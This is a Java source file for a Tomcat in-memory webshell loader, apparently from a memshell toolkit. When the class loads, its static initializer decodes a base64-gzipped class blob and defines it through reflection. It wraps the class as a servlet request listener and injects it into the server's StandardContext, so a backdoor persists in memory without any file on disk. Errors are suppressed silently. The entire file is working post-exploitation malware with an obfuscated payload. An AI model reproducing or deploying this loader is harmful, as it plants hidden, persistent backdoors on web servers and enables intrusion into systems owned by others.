package com.demo.memshell.loader;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.*;
import java.util.zip.GZIPInputStream;

/**
 * @author Whoopsunix
 * <p>
 * 5-10 全版本
 */
public class ListenerThreadLoader {
    private static String gzipObject = "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";
    private static Object[] applicationEventListenersObjects;
    private static List applicationEventListeners;
    private static Object object = null;

    public ListenerThreadLoader() {
    }

    static {
        try {
            getObject();

            // 获取 standardContext
            Object standardContext = getTargetObject("org.apache.catalina.core.StandardContext");
            if (!isInject(standardContext)) {
                inject(standardContext);
            }

        } catch (Throwable e) {

        }
    }

//    public static boolean isInject(Object standardContext, Object object) {
//        return false;
//    }
//    public static void inject(Object standardContext, Object object) throws Exception {
//
//    }

    /**
     * Listener
     */
    public static boolean isInject(Object standardContext) {
        if (object == null)
            return true;
        try {
            applicationEventListeners = (List) getFieldValue(standardContext, "applicationEventListenersList");
            for (int i = 0; i < applicationEventListeners.size(); i++) {
                if (applicationEventListeners.get(i).getClass().getName().contains(object.getClass().getName())) {
                    return true;
                }
            }
        } catch (Exception e) {

        }

        try {
            applicationEventListenersObjects = (Object[]) getFieldValue(standardContext, "applicationEventListenersObjects");
            for (int i = 0; i < applicationEventListenersObjects.length; i++) {
                Object applicationEventListenersObject = applicationEventListenersObjects[i];
                if (applicationEventListenersObject instanceof Proxy && object instanceof Proxy) {
                    Object h = getFieldValue(applicationEventListenersObject, "h");
                    Object h2 = getFieldValue(object, "h");
                    if (h.getClass().getName().contains(h2.getClass().getName())) {
                        return true;
                    }
                } else {
                    if (applicationEventListenersObject.getClass().getName().contains(object.getClass().getName())) {
                        return true;
                    }
                }
            }
        } catch (Exception e) {

        }
        return false;
    }

    public static void inject(Object standardContext) throws Exception {
        if (object == null)
            return;

        if (applicationEventListenersObjects != null) {
            // 5 6
            Object[] newApplicationEventListenersObjects = new Object[applicationEventListenersObjects.length + 1];
            System.arraycopy(applicationEventListenersObjects, 0, newApplicationEventListenersObjects, 0, applicationEventListenersObjects.length);
            newApplicationEventListenersObjects[newApplicationEventListenersObjects.length - 1] = object;
            setFieldValue(standardContext, "applicationEventListenersObjects", newApplicationEventListenersObjects);
        } else {
            // 7 8 9 10
            invokeMethod(standardContext, "addApplicationEventListener", new Class[]{Object.class}, new Object[]{object});
        }
    }

    public static void getObject() throws Exception {
        // 动态代理兼容 javax jakarta
        Class listenerClass = null;
        try {
            listenerClass = Class.forName("jakarta.servlet.ServletRequestListener");
        } catch (Exception e) {
            try {
                listenerClass = Class.forName("javax.servlet.ServletRequestListener");
            } catch (ClassNotFoundException ex) {

            }
        }

        byte[] bytes = decompress(gzipObject);
//            URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
//            Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
//            defMethod.setAccessible(true);
//            Class cls = (Class) defMethod.invoke(urlClassLoader, bytes, 0, bytes.length);
//            Object object = cls.newInstance();

        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defineClass.setAccessible(true);
        Class clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
        Object javaObject = clazz.newInstance();

        object = Proxy.newProxyInstance(listenerClass.getClassLoader(), new Class[]{listenerClass}, (InvocationHandler) javaObject);
    }


    // tools
    public static byte[] decompress(String gzipObject) throws IOException {
        final byte[] compressedData = new sun.misc.BASE64Decoder().decodeBuffer(gzipObject);
        ByteArrayInputStream bais = new ByteArrayInputStream(compressedData);
        try {
            GZIPInputStream gzipInputStream = new GZIPInputStream(bais);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzipInputStream.read(buffer)) > 0) {
                baos.write(buffer, 0, len);
            }
            return baos.toByteArray();
        } catch (Exception e) {

        }
        return null;
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method;
        try {
            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
        } catch (NoSuchMethodException e) {
            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
        }
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }

    public static Object getTargetObject(String className) throws Exception {
        List<ClassLoader> activeClassLoaders = new ListenerThreadLoader().getActiveClassLoaders();

        Class cls = getTargetClass(className, activeClassLoaders);

        // 死亡区域 已检查过的类
        HashSet breakObject = new HashSet();
        breakObject.add(System.identityHashCode(breakObject));

        // 原始类型和包装类都不递归
        HashSet<String> breakType = new HashSet(Arrays.asList(int.class.getName(), short.class.getName(), long.class.getName(), double.class.getName(), byte.class.getName(), float.class.getName(), char.class.getName(), boolean.class.getName(), Integer.class.getName(), Short.class.getName(), Long.class.getName(), Double.class.getName(), Byte.class.getName(), Float.class.getName(), Character.class.getName(), Boolean.class.getName(), String.class.getName()));

        Object result = getTargetObject(cls, Thread.currentThread(), breakObject, breakType, 30);

        return result;
    }

    /**
     * 递归查找属性
     */
    public static Object getTargetObject(Class targetCls, Object object, HashSet breakObject, HashSet<String> breakType, int maxDepth) {
        // 最大递归深度
        maxDepth--;
        if (maxDepth < 0) {
            return null;
        }

        if (object == null) {
            return null;
        }

        // 寻找到指定类返回
        if (targetCls.isInstance(object)) {
            return object;
        }

        // 获取内存地址，来标识唯一对象
        Integer hash = System.identityHashCode(object);

        if (breakObject.contains(hash)) {
            return null;
        }
        breakObject.add(hash);

        // 获取对象所有 Field
        Field[] fields = object.getClass().getDeclaredFields();
        ArrayList fieldsArray = new ArrayList();
        Class objClass = object.getClass();
        while (objClass != null) {
            Field[] superFields = objClass.getDeclaredFields();
            fieldsArray.addAll(Arrays.asList(superFields));
            objClass = objClass.getSuperclass();
        }
        fields = (Field[]) fieldsArray.toArray(new Field[0]);


        for (Field field : fields) {
            try {
                Class type = field.getType();

                if (breakType.contains(type.getName())) {
                    continue;
                }

                // 获取 Field 值
                field.setAccessible(true);
                Object value = field.get(object);
                Object result = null;

                // 递归查找
                if (value instanceof Map) {
                    // Map 的 kv 都要遍历
                    Map map = (Map) value;
                    for (Object o : map.entrySet()) {
                        Map.Entry entry = (Map.Entry) o;
                        result = getTargetObject(targetCls, entry.getKey(), breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                        result = getTargetObject(targetCls, entry.getValue(), breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else if (value instanceof Iterable) {
                    // 集合的元素都要遍历
                    Iterable iterable = (Iterable) value;
                    for (Object o : iterable) {
                        result = getTargetObject(targetCls, o, breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else if (type.isArray()) {
                    // 数组的元素都要遍历
                    Object[] array = (Object[]) value;
                    for (Object o : array) {
                        result = getTargetObject(targetCls, o, breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else {
                    result = getTargetObject(targetCls, value, breakObject, breakType, maxDepth);
                }

                if (result != null) {
                    return result;
                }
            } catch (Throwable e) {

            }
        }

        return null;
    }


    /**
     * 遍历 ClassLoader 加载目标 Class
     */
    public static Class getTargetClass(String className, List<ClassLoader> activeClassLoaders) {
        for (ClassLoader activeClassLoader : activeClassLoaders) {
            try {
                return Class.forName(className, true, activeClassLoader);
            } catch (Throwable e) {

            }
        }
        return null;
    }

    /**
     * 获取活跃线程
     */
    public List<ClassLoader> getActiveClassLoaders() throws Exception {
        Set<ClassLoader> activeClassLoaders = new HashSet();

        // 加载当前对象的加载器
        activeClassLoaders.add(this.getClass().getClassLoader());

        // 当前线程的上下文类加载器
        activeClassLoaders.add(Thread.currentThread().getContextClassLoader());

//        // 应用程序类加载器
//        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();
//        activeClassLoaders.add(systemClassLoader);
//
//        // 扩展类加载器
//        activeClassLoaders.add(systemClassLoader.getParent());

        // 获取线程组
        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
        Thread[] threads = new Thread[threadGroup.activeCount()];
        int count = threadGroup.enumerate(threads, true);
        for (int i = 0; i < count; i++) {
            activeClassLoaders.add(threads[i].getContextClassLoader());
        }

        return new ArrayList(activeClassLoaders);
    }

}
